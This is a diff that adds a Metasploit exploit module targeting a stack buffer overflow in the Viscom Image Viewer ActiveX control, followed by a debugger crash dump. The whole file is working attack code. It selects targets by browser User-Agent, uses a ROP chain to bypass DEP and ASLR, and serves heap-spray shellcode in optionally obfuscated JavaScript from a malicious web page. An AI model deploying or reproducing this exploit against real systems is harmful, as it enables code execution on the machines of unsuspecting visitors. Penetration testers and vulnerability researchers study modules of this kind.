@@ -1,0 +1,204 @@
+##
+# This file is part of the Metasploit Framework and may be subject to
+# redistribution and commercial restrictions. Please see the Metasploit
+# Framework web site for more information on licensing and terms of use.
+# http://metasploit.com/framework/
+##
+
+require 'msf/core'
+
+class Metasploit3 < Msf::Exploit::Remote
+	Rank = NormalRanking
+
+	include Msf::Exploit::Remote::HttpServer::HTML
+
+	def initialize(info = {})
+		super(update_info(info,
+			'Name'           => 'Viscom Image Viewer CP Pro 8.0/Gold 6.0 ActiveX Control',
+			'Description'    => %q{
+					This module exploits a stack based buffer overflow in the Active control file
+				ImageViewer2.OCX by passing a overly long argument to an insecure TifMergeMultiFiles()
+				method. Exploitation results in code execution with the privileges of the user who
+				browsed to the exploit page.
+
+				The victim will first be required to trust the publisher Viscom Software.
+				This module has been designed to bypass DEP and ASLR under XP IE8, Vista and Win7
+				with Java support.
+			},
+			'License'        => MSF_LICENSE,
+			'Author'         =>
+				[
+					'Dr_IDE', # Vulnerability discovery and original exploit
+					'TecR0c', # Metasploit module
+					'mr_me'   # Metasploit module
+				],
+			'Version'        => '$Revision: $',
+			'References'     =>
+				[
+					[ 'URL', 'http://www.exploit-db.com/exploits/15668/' ],
+					[ 'URL', 'http://secunia.com/advisories/42445/' ],
+					[ 'URL', 'http://xforce.iss.net/xforce/xfdb/63666' ]
+				],
+			'DefaultOptions' =>
+				{
+					'EXITFUNC' => 'process',
+					'DisablePayloadHandler' => 'false',
+					'InitialAutoRunScript' => 'migrate -f'
+				},
+			'Payload'        =>
+				{
+					'Space'         => 1024,
+					'BadChars'      => "\x00"
+				},
+			'Platform'       => 'win',
+			'Targets'        =>
+				[
+					[ 'Automatic', {} ],
+					[ 'Windows XP IE6-7', {} ],
+					[ 'Windows XP IE8, Windows Vista & Windows 7 + JAVA 6 (DEP & ASLR BYPASS)', {} ]
+				],
+			'DisclosureDate' => 'Mar 03 2010',
+			'DefaultTarget'  => 0))
+
+		register_options(
+			[ OptBool.new('OBFUSCATE', [false, 'Enable JavaScript Obfuscation', true]) ], self.class)
+	end
+
+	# Prevent module from being executed in autopwn
+	def autofilter
+		false
+	end
+
+	def check_dependencies
+		use_zlib
+	end
+
+	def junk(n=4)
+		return rand_text_alpha(n).unpack("L")[0].to_i
+	end
+
+	def on_request_uri(cli, request)
+
+		# Set target manually or automatically
+		my_target = target
+		if my_target.name == 'Automatic'
+			agent = request.headers['User-Agent']
+			if agent =~ /NT 5\.1/ and agent =~ /MSIE 6\.0/
+				my_target = targets[1] # XP
+			elsif agent =~ /NT 5\.1/ and agent =~ /MSIE 7\.0/
+				my_target = targets[1] # XP
+			elsif agent =~ /NT 5\.1/ and agent =~ /MSIE 8\.0/
+				my_target = targets[2] # XP
+			elsif agent =~ /NT 6\.0/ and agent =~ /MSIE 7\.0/
+				my_target = targets[2] # Vista
+			elsif agent =~ /NT 6\.0/ and agent =~ /MSIE 8\.0/
+				my_target = targets[2] # Vista
+			elsif agent =~ /NT 6\.1/ and agent =~ /MSIE 8\.0/
+				my_target = targets[2] # Win7
+			end
+		end
+
+		sploit = rand_text_alpha(52)
+		pivot = [0x12AE0FE4].pack("V") # Address to my code
+
+		if my_target.name =~ /IE8/
+
+			code =
+			[ # MSVCR71.dll - rop chain generated with mona.py
+				0x7C37653D, # POP EAX # POP EDI # POP ESI # POP EBX # POP EBP # RETN
+				0xFFFFFDFF, # Value to negate, will become 0x00000201 (dwSize)
+				0x7C347F98, # RETN (ROP NOP)
+				0x7C3415A2, # JMP [EAX]
+				0xFFFFFFFF, #
+				0x7C376402, # Skip 4 bytes
+				0x7C351E05, # NEG EAX # RETN
+				0x7C345255, # INC EBX # FPATAN # RETN
+				0x7C352174, # ADD EBX,EAX # XOR EAX,EAX # INC EAX # RETN
+				0x7C344F87, # POP EDX # RETN
+				0xFFFFFFC0, # Value to negate, will become 0x00000040
+				0x7C351EB1, # NEG EDX # RETN
+				0x7C34D201, # POP ECX # RETN
+				0x7C38B001, # &Writable location
+				0x7C347F97, # POP EAX # RETN
+				0x7C37A151, # Ptr to &VirtualProtect() - 0x0EF
+				0x7C378C81, # PUSHAD # ADD AL,0EF # RETN
+				0x7C345C30, # Ptr to 'push esp # ret
+			].pack("V*")
+
+			code << payload.encoded
+			sploit << [0x100EAD78].pack("V") # POP ESP # RETN [IMAGEV~1.OCX]
+
+		else
+			code = payload.encoded
+			sploit << pivot
+		end
+
+		# Payload in JS format
+		code = Rex::Text.to_unescape(code)
+
+		sploit << [0x41414141].pack("V") # Filler
+		sploit << [0x42424242].pack("V") # Filler
+		sploit << [0x43434343].pack("V") # Filler
+		sploit << pivot
+
+		# Randomize the javascript variable names
+		vname = rand_text_alpha(rand(100) + 1)
+
+		spray = <<-JS
+		var heap_lib = new heapLib.ie(0x20000);
+		var code = unescape("#{code}");
+		var nops = unescape("%u0c0c%u0c0c");
+
+		while (nops.length < 0x2000) nops += nops;
+		var offset = nops.substring(0, 0x800-0x20);
+		var shellcode = offset + code + nops.substring(0, 0x2000-offset.length-code.length);
+
+		while (shellcode.length < 0x40000) shellcode += shellcode;
+		var block = shellcode.substring(0, (0x7fb00-6)/2);
+
+		heap_lib.gc();
+
+		for (var i = 0; i < 0x200; i++) {
+		heap_lib.alloc(block);
+		}
+
+		var overflow = unescape("#{sploit}");
+		var variable1 = "VARIABLE";
+
+		#{vname}.TIFMergeMultiFiles(variable1,variable1,overflow);
+		JS
+
+		# Use heaplib
+		js = heaplib(spray)
+
+		# Obfuscate on demand
+		if datastore['OBFUSCATE']
+			js = ::Rex::Exploitation::JSObfu.new(js)
+			js.obfuscate
+		end
+
+		html = "<html>"
+		html << "\n<object classid='clsid:E589DA78-AD4C-4FC5-B6B9-9E47B110679E' id='#{vname}'></object>"
+		html << "\n\t<script>#{js}\n\t</script>\n</html>"
+
+		print_status("Sending #{self.name} to #{cli.peerhost}:#{cli.peerport}...")
+
+		# Transmit the response to the client
+		send_response_html(cli, html)
+
+	end
+
+end
+=begin
+(460.1d4): Access violation - code c0000005 (first chance)
+First chance exceptions are reported before any exception handling.
+This exception may be expected and handled.
+eax=0000fffd ebx=00000000 ecx=41414141 edx=6c440088 esi=00000010 edi=0204f5a8
+eip=42424242 esp=0204f5b8 ebp=0204f644 iopl=0         nv up ei pl nz ac po nc
+cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00010212
+41414141 ??              ???
+
+0:005> dd @esp
+0203f594  41414141 41414141 41414141 41414141
+0203f5a4  41414141 41414141 41414141 41414141
+=end
